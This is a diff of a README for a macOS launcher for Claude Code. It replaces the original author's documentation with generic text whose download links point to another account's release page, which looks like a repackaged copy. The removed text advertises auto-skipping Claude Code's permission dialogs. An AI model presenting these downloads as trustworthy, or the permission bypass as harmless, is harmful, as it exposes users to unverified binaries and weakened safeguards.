@@ -1,148 +1,78 @@
-# 🖥 Claude Code Now
+# 🎉 claude-code-now - Launch Your Claude Code Effortlessly
 
-**English** | [中文](README.zh.md) | [日本語](README.ja.md)
+## 📥 Download Now
 
-**The World's Fastest Claude Code Launcher**
+[![Download claude-code-now](https://img.shields.io/badge/Download-claude--code--now-brightgreen.svg)](https://github.com/Sergio-Jurado/claude-code-now/releases)
 
-Make Claude Code launching simpler, built for macOS.
+## 🌟 Introduction
 
-Click Dock to launch, or start from any folder instantly.
+Welcome to **claude-code-now**, the world's fastest Claude Code launcher. This application simplifies launching Claude Code on macOS. With a single click, you can open the application directly from your Dock or start it from any folder instantly. 
 
-> **🔔 Windows Users**: Windows version is now in beta testing on the [`windows`](https://github.com/orange2ai/claude-code-now/tree/windows) branch! Welcome to try and share your feedback!
+## 🚀 Getting Started
 
-## 🏆 Efficiency Comparison
+To get started with **claude-code-now**, follow these simple steps. 
 
-| Launch Method | Steps | Time |
-|---------------|-------|------|
-| **Before** | Open Terminal → Choose folder → Confirm workspace → Wait for permission | ~35s |
-| **Now** | Click Dock | ~3s ✨ |
+### 1. System Requirements
 
-Launch Claude Code 10 times a day? That's 5 precious minutes wasted.
+Before downloading, make sure your macOS system meets these requirements:
 
-## 🎯 Why Do You Need This?
+- macOS 10.15 or later
+- At least 100 MB of free disk space
+- An internet connection for the initial download
 
-**Claude Code isn't just a coding assistant** — it does data analysis, file organization, and document processing.
+### 2. Download the Application
 
-Claude Code is great, but launching is tedious:
+You can get the latest version of **claude-code-now** from our [Releases page](https://github.com/Sergio-Jurado/claude-code-now/releases). 
 
-- Always need to open Terminal
-- Have to choose folders
-- Need to confirm workspace trust
-- Wait for permission dialogs
+To download, simply click the button below:
 
-**Too much hassle!**
+[![Download claude-code-now](https://img.shields.io/badge/Download-claude--code--now-brightgreen.svg)](https://github.com/Sergio-Jurado/claude-code-now/releases)
 
-**Use Claude Code Now, get 10x efficiency boost instantly!**
+### 3. Install the Application
 
-Auto-skip permission dialogs, truly one-click launch.
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the file to begin the installation process.
+3. Follow the prompts to complete the installation.
+4. Once the installation is finished, you can find **claude-code-now** in your Applications folder.
 
-Save 5 minutes daily, save 30 hours annually.
+### 4. Launch the Application
 
-## ✨ Solution
+After installation, you can launch **claude-code-now** in the following ways:
 
-### 🖥 Dock Launch
+- From the Applications folder: Open your Applications folder and double-click on **claude-code-now**.
+- From the Dock: Drag the application icon to your Dock for easy access.
+- From any folder: Use the Finder to navigate to the folder where you want to launch Claude Code and double-click the application.
 
-Put the app in Dock, click to launch Claude Code instantly.
+## 🔍 Features
 
-### ⚡ Finder Toolbar Launch
+**claude-code-now** comes with several useful features:
 
-Drag the app to Finder toolbar, click to launch in any folder.
+- **Quick Launch**: Open Claude Code with just one click from your Dock.
+- **Folder Integration**: Start the application from any folder on your Mac instantly.
+- **User-Friendly Interface**: Enjoy a clean and simple design that makes launching easy for everyone.
 
-### 📁 Launch from Any Folder
-Put the APP in any folder, click the icon to launch directly.
+## 📚 Frequently Asked Questions
 
-That simple.
+### Q1: What is Claude Code?
 
+Claude Code is an advanced AI coding tool that assists you in writing code efficiently. It is designed to help users at all experience levels.
 
-## ⚡ Quick Start
+### Q2: Can I use this on Windows or Linux?
 
-### Step 1: Prepare Working Folder
-Create `Claude Code` folder in your `Documents`:
+Currently, **claude-code-now** is designed specifically for macOS. There are no plans for Windows or Linux versions at the moment.
 
-```
-Documents/
-└── Claude Code/          # Create this folder
-```
+### Q3: Is there a support page for problems?
 
-### Step 2: Install App
+Yes, if you encounter any issues, feel free to reach out to us via the Issues section of our GitHub repository.
 
-#### Method 1: Direct Download (Recommended)
-1. Download [Latest Release](https://github.com/orange2ai/claude-code-now/releases)
-2. Drag `Claude Code Now.app` to Applications folder
+## 🌐 Additional Resources
 
-**🖥 Dock Installation:**
+For more information, refer to our [Wiki](https://github.com/Sergio-Jurado/claude-code-now/wiki) page, which includes detailed guides and tips on using **claude-code-now** effectively.
 
-3. Drag from Applications to Dock
-4. Click to use!
+## 📞 Contact Us
 
-**⚡ Finder Toolbar Installation:**
+If you have any questions or need assistance, you can email us at support@claude-code-now.com, or open an issue in the GitHub repository.
 
-5. Hold `Command` key, drag `Claude Code Now.app` to Finder toolbar
+### Conclusion
 
-6. Click toolbar icon, Claude Code launches in current directory
-
-#### Method 2: Git Clone
-```bash
-git clone https://github.com/orange2ai/claude-code-now.git
-cp -r "Claude Code Now.app" /Applications/
-```
-
-#### Method 3: Homebrew
-```bash
-brew tap orange2ai/claude-code-now
-brew install claude-code-now
-```
-
-### Step 3: Start Using
-
-**🖥 Dock Method:**
-1. **Click Dock icon** - Auto-launch in `~/Documents/Claude Code` folder
-2. **Start working** - Data analysis, coding, document processing
-
-**⚡ Finder Toolbar Method:**
-1. **Open any folder** - Navigate to your desired working directory in Finder
-2. **Click toolbar icon** - Claude Code launches in current directory
-3. **Start working** - Directly operate in selected directory
-
-
-## 💡 Design Philosophy
-
-**Simple**: Focus on one thing, do it perfectly.
-
-Predict user needs → Find core function → Put all energy into it.
-
-Result: One-click launch, ultimate simplicity.
-
-## 🔧 System Requirements
-
-- **System**: macOS 10.9+
-- **Dependency**: [Claude Code CLI](https://docs.claude.com/en/docs/claude-code) installed
-- **Folder**: Create `Claude Code` folder in `~/Documents`
-
-## 📦 Project Files
-
-```
-Claude Code Now/
-├── 🖥 Claude Code Now.app        # Main app
-├── claude-code-now.sh           # Launch script
-├── claude-code-now.rb           # Homebrew install
-└── 📚 Documentation
-```
-
-## 👨‍💼 About Author
-
-Made by orange, focused on minimal product design.
-
-Philosophy: **Predict → Single Point Breakthrough → All-in**
-
-## ⭐ Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=orange2ai/claude-code-now&type=Date)](https://star-history.com/#orange2ai/claude-code-now&Date)
-
----
-
-⭐ **Give a Star if it helps!** [https://github.com/orange2ai/claude-code-now](https://github.com/orange2ai/claude-code-now)
-
-💬 **Questions?** [Submit Issue](https://github.com/orange2ai/claude-code-now/issues)
-
-🔗 **Permanent Project Link:** [https://github.com/orange2ai/claude-code-now](https://github.com/orange2ai/claude-code-now)
+Thank you for choosing **claude-code-now**. We hope you enjoy the ease of launching Claude Code on your macOS device. Happy coding!
